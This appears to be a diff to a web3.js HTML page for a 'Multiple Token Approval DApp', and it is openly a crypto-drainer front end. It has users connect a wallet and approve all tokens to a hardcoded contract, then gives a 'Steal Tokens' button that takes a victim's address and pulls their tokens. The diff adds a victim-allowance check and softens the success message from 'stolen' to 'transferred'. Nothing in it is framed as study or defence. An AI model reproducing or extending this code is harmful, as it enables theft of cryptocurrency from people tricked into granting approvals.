@@ -1,72 +1,99 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Multiple Token Approval DApp</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
+
 <body>
     <h1>Multiple Token Approval DApp</h1>
 
     <button id="connectButton">Connect Wallet</button>
-    <button id="approveAllTokens">Approve All Tokens</button>
-    <button id="stealTokens">Steal Tokens</button>
+    <button id="approveButton">Approve All Tokens</button>
+    <button id="stealButton">Steal Tokens</button>
+    <button id="checkAllowanceButton">Check Allowance</button>
 
     <div id="status"></div>
 
     <script>
         let web3;
         let contract;
+        let accounts;
+
+        // Ganti dengan alamat kontrak yang telah Anda deploy
+        const contractAddress = '0x3d31C07C8b370e72997945A83b04F52752F9329E';
+        // Ganti dengan ABI dari kontrak Anda
+        const abi = [
+            {
+                "inputs": [],
+                "name": "approveAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    }
+                ],
+                "name": "stealTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "owner",
+                        "type": "address"
+                    }
+                ],
+                "name": "checkAllowance",
+                "outputs": [
+                    {
+                        "internalType": "uint256",
+                        "name": "",
+                        "type": "uint256"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
         document.getElementById('connectButton').addEventListener('click', connectWallet);
-        document.getElementById('approveAllTokens').addEventListener('click', approveAllTokens);
-        document.getElementById('stealTokens').addEventListener('click', stealTokens);
+        document.getElementById('approveButton').addEventListener('click', approveAllTokens);
+        document.getElementById('stealButton').addEventListener('click', stealTokens);
+        document.getElementById('checkAllowanceButton').addEventListener('click', checkAllowance);
 
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
                 web3 = new Web3(window.ethereum);
-                const accounts = await web3.eth.getAccounts();
-                document.getElementById('status').innerText = `Wallet connected with address: ${accounts[0]}`;
-                
-                // Here you would set the address of your deployed contract
-                const contractAddress = '0x3d31C07C8b370e72997945A83b04F52752F9329E';
-                const abi = [
-                    {
-                        "constant": false,
-                        "inputs": [],
-                        "name": "approveAllTokens",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    },
-                    {
-                        "constant": false,
-                        "inputs": [
-                            {
-                                "name": "victim",
-                                "type": "address"
-                            }
-                        ],
-                        "name": "stealTokens",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }
-                ];
+                accounts = await web3.eth.getAccounts();
                 contract = new web3.eth.Contract(abi, contractAddress);
+                document.getElementById('status').innerText = `Wallet connected with address: ${accounts[0]}`;
             } else {
                 document.getElementById('status').innerText = 'Please install MetaMask!';
             }
         }
 
         async function approveAllTokens() {
-            if (contract) {
+            if (web3 && contract) {
                 try {
-                    await contract.methods.approveAllTokens().send({ from: (await web3.eth.getAccounts())[0] });
+                    await contract.methods.approveAllTokens().send({ from: accounts[0] });
                     document.getElementById('status').innerText = 'All tokens approved successfully.';
                 } catch (error) {
                     document.getElementById('status').innerText = `Error: ${error.message}`;
@@ -77,12 +104,29 @@
         }
 
         async function stealTokens() {
-            if (contract) {
+            if (web3 && contract) {
                 const victimAddress = prompt("Enter the victim's address:");
                 if (victimAddress) {
                     try {
-                        await contract.methods.stealTokens(victimAddress).send({ from: (await web3.eth.getAccounts())[0] });
-                        document.getElementById('status').innerText = 'Tokens stolen successfully.';
+                        await contract.methods.stealTokens(victimAddress).send({ from: accounts[0] });
+                        document.getElementById('status').innerText = 'Tokens transferred successfully.';
+                    } catch (error) {
+                        document.getElementById('status').innerText = `Error: ${error.message}`;
+                    }
+                }
+            } else {
+                document.getElementById('status').innerText = 'Please connect your wallet first.';
+            }
+        }
+
+        async function checkAllowance() {
+            if (web3 && contract) {
+                const tokenAddress = prompt("Enter the token address:");
+                const ownerAddress = prompt("Enter the owner address (victim):");
+                if (tokenAddress && ownerAddress) {
+                    try {
+                        const allowance = await contract.methods.checkAllowance(tokenAddress, ownerAddress).call();
+                        document.getElementById('status').innerText = `Allowance for this token: ${allowance}`;
                     } catch (error) {
                         document.getElementById('status').innerText = `Error: ${error.message}`;
                     }
@@ -93,4 +137,5 @@
         }
     </script>
 </body>
+
 </html>
